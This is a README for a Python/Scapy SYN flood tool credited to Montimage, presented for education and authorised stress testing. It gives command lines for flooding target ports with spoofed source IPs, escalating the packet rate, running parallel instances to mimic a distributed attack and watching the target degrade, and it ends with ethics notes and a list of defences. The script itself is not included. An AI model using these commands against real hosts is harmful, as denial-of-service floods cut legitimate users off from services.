# SYN Flood Attack Simulation

## Overview

A SYN Flood is a type of Denial of Service (DoS) attack that exploits the TCP three-way handshake. The attacker sends numerous SYN packets to the target server but never completes the handshake by sending the final ACK packet. This can exhaust the target's connection resources, preventing legitimate users from establishing connections.

This script simulates a SYN flood attack for educational and authorized security testing purposes.

## Features

- Customizable packet rate and count
- Random source IP spoofing
- Port targeting (single port or port range)
- Detailed logging and statistics
- Performance monitoring

## Requirements

- Python 3.6+
- Scapy library
- Root/Administrator privileges (required for packet manipulation)

## Installation

```bash
# Install required dependencies
pip install scapy
```

## Usage

### Basic Attack

The simplest way to run a SYN flood attack is to specify a target IP and port:

```bash
sudo python syn_flood.py -t 192.168.1.10 -p 80
```

This will:
- Send 1000 SYN packets (default) to port 80 on the target
- Use a rate of 100 packets per second (default)
- Spoof the source IP addresses (enabled by default)

### Customizing the Attack

#### Target Multiple Ports

You can target multiple ports or port ranges:

```bash
# Target specific ports
sudo python syn_flood.py -t 192.168.1.10 -p 80,443,8080

# Target a range of ports
sudo python syn_flood.py -t 192.168.1.10 -p 80-100

# Target both specific ports and ranges
sudo python syn_flood.py -t 192.168.1.10 -p 80,443,8000-8100
```

#### Adjust Packet Count and Rate

To control the intensity of the attack:

```bash
# Send 5000 packets at 200 packets per second
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 5000 -r 200

# Send 100 packets at a slower rate (10 per second)
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 100 -r 10
```

#### Disable IP Spoofing

By default, the script uses random source IPs. To disable this:

```bash
sudo python syn_flood.py -t 192.168.1.10 -p 80 --no-spoof
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
sudo python syn_flood.py -t 192.168.1.10 -p 80 -v
```

## Advanced Usage

### Testing Server Limits

To find the connection limits of a server, you can gradually increase the packet rate:

```bash
# Start with a low rate
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 1000 -r 50

# Increase the rate if no effect is observed
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 1000 -r 100
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 1000 -r 200
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 1000 -r 500
```

### Distributed Attack Simulation

To simulate a more realistic distributed attack:

```bash
# In one terminal
sudo python syn_flood.py -t 192.168.1.10 -p 80 -c 500 -r 50

# In another terminal
sudo python syn_flood.py -t 192.168.1.10 -p 443 -c 500 -r 50

# In a third terminal
sudo python syn_flood.py -t 192.168.1.10 -p 8080 -c 500 -r 50
```

## Monitoring the Attack

To observe the effect of the attack, you can use various tools:

```bash
# Monitor connections on the target
netstat -nat | grep SYN_RECV | wc -l

# Monitor network traffic
sudo tcpdump -i eth0 "tcp[tcpflags] & (tcp-syn) != 0"

# Monitor server response time
curl -o /dev/null -s -w "%{time_total}\n" http://target-ip/
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- Network stress testing

Unauthorized use against systems without explicit permission is illegal and unethical.

## Defensive Measures

Common defenses against SYN flood attacks include:

1. SYN cookies
2. Increasing the backlog queue
3. Reducing SYN-RECEIVED timer
4. Using a firewall with rate limiting
5. Implementing connection timeouts

Understanding these attacks helps in implementing proper defenses.

## Command Line Options

```
-t, --target     Target IP address (required)
-p, --ports      Target ports (comma-separated, ranges allowed, e.g., '80,443,8000-8080') (required)
-c, --count      Number of packets to send (default: 1000)
-r, --rate       Number of packets to send per second (default: 100)
-s, --spoof      Use random source IPs (default: True)
--no-spoof       Don't use random source IPs
-v, --verbose    Enable verbose output
```

## License

Proprietary - Montimage
